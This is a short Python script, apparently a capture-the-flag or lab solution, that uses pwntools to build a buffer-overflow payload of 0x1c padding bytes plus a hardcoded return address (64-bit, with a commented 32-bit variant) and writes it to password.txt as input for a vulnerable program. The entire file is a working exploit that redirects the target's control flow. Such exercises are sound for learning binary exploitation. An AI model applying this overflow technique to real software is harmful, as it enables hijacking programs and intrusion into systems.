from pwn import *

# 32bit:
# payload = b'a'*0x1c + p32(0x8049276)
# with open ('password32.txt','wb') as f:
#     f.write(payload)

# 64bit
payload = b'a'* 0x1c + p64(0x401550)
with open ('password.txt','wb') as f:
    f.write(payload)
